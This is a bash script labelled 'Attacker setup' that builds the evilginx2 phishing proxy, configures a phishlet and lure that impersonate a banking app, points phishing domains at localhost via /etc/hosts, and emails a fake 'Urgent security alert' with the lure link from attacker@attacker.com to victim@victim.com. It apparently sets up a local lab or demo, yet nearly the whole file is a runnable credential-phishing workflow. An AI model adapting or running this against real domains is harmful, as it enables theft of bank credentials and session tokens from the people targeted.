#!/bin/bash

echo "Attacker setup."

echo "Enter the subdomain you will use for the bank app (optional): "
read subdomain

echo "Enter the root domain you will use for the banking app: "
read domain

echo "Enter the root domain you will use for the phishing URL: "
read domain_phish

echo "Cloning submodules."
git submodule update --init > /dev/null

if ! command -v go &> /dev/null; then
  echo "Installing Go."
  sudo apt install -y golang-go &> /dev/null
fi

if ! command -v docker &> /dev/null
then
  if ! command -v curl &> /dev/null
  then
    echo "Installing curl."
    sudo apt install -y curl &> /dev/null
  fi

  echo "Installing Docker."
  curl https://get.docker.com | sh
else
  echo "Docker installed already."
fi

cd evilginx2
make
cd ../
mv evilginx2/build/evilginx .

echo "pwd: "
echo $(pwd)

echo "domain: "
echo $domain
echo "subdomain: "
echo $subdomain

sed -i "s/demo/${subdomain}/g" demo.yaml
sed -i "s/hnolan.com/${domain}/g" demo.yaml

echo "Setting up /etc/hosts."
etchost="127.0.0.1 ${subdomain}.${domain_phish}"
sudo bash -c "echo '$etchost' >> /etc/hosts"
sudo bash -c "echo '127.0.0.1 web.mail'>> /etc/hosts"

cd mail
sudo docker compose up -d &> /dev/null
echo "Mail app launched at http://web.mail:8080."

cd ../
output=$(sudo ./evilginx -p ./ -developer <<EOF
config domain $domain_phish
config ipv4 127.0.0.1
phishlets hostname demo $domain_phish
phishlets enable demo
phishlets unhide demo
lures create demo
EOF
)

lure_id=$(echo "$output" | grep -oP 'created lure with ID: \K\d+')

output=$(sudo ./evilginx -p ./ -developer <<EOF
lures get-url $lure_id
EOF
)

phishing_url=$(echo "$output" | grep -E "https://${subdomain}\.${domain_phish}/[A-Za-z0-9]+" | tail -1)

echo "Phishing URL: $phishing_url"
sleep 10
curl --url "smtp://localhost:8025" \
  --mail-from "attacker@attacker.com" \
  --mail-rcpt "victim@victim.com" \
  --upload-file - <<EOF
Subject: Urgent security alert!
From: attacker@attacker.com
To: victim@victim.com
Date: $(date -R)
Content-Type: text/html; charset=UTF-8

<html>
<body>
<p>We have observed unusual activity on your bank account. Please review ASAP:</p>
<p><a href="${phishing_url}">Review Account Activity</a></p>
</body>
</html>
EOF

sudo ./evilginx -p ./ -developer
